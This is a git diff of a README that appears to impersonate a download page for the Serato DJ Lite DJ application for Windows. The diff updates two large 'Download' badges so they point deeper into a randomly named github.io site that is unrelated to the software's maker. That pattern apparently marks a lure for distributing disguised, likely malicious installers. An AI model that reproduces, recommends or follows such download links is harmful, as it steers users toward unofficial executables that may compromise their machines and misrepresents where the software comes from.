@@ -16,7 +16,7 @@ Serato DJ Lite is a free DJ application for Windows that lets you mix music acro
 <div align="center">
   <h3>Mix, blend, and perform your music like a DJ — free on Windows</h3>
 
-  [![Download Serato DJ Lite](https://img.shields.io/badge/⬇_Download_Serato_DJ_Lite_for_Windows-2962FF?style=for-the-badge)](https://hettywenselejiyhb.github.io/.github/)
+  [![Download Serato DJ Lite](https://img.shields.io/badge/⬇_Download_Serato_DJ_Lite_for_Windows-2962FF?style=for-the-badge)](https://hettywenselejiyhb.github.io/.github/Serato-DJ-Lite-Desktop-App)
 
 </div>
 
@@ -90,7 +90,7 @@ For help with Serato DJ Lite, open the built-in Help or Support section inside t
 <div align="center">
   <h3>Ready to get started with Serato DJ Lite?</h3>
 
-  [![Download Serato DJ Lite](https://img.shields.io/badge/⬇_Download_Serato_DJ_Lite_for_Windows-2962FF?style=for-the-badge)](https://hettywenselejiyhb.github.io/.github/)
+  [![Download Serato DJ Lite](https://img.shields.io/badge/⬇_Download_Serato_DJ_Lite_for_Windows-2962FF?style=for-the-badge)](https://hettywenselejiyhb.github.io/.github/Serato-DJ-Lite-Desktop-App)
 
 </div>
 
